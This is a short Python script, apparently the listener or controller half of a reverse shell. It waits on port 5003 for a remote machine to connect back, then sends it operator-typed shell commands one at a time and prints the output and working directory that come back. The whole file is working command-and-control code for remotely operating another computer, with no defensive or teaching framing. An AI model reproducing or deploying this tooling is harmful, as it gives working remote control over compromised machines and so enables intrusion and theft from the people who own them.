import socket
from colorama import Fore
SERVER_HOST = "0.0.0.0"
SERVER_PORT = 5003
BUFFER_SIZE = 1024*128
SEPERATOR = "<sep>"
s = socket.socket()

def Listen():
    timeout_time = input("Set the timeout time in seconds: ")
    s.bind((SERVER_HOST, SERVER_PORT))
    s.listen(5)
    s.settimeout(int(timeout_time))
    print(f"Listening as {SERVER_HOST} : {SERVER_PORT} for {int(timeout_time)} Second(s)\n")
    # Accept any connect request
    try:
        client_socket, client_address = s.accept()
    except TimeoutError:
        print(Fore.RED + "No connection established in the given time!")
        return
    print(f"{client_address[0]}: {client_address[1]} Connected!\n")
    # Current work dir
    cwd = client_socket.recv(BUFFER_SIZE).decode()
    print(f"[+] Current working directory: ", cwd + "\n")
    while True:
        command = input(f"{cwd} $> ")
        if not command.strip():
            continue
    
        client_socket.send(command.encode())
        if command.lower() == "exit":
            break
        output = client_socket.recv(BUFFER_SIZE).decode()
        results, cwd = output.split(SEPERATOR)
        print(results)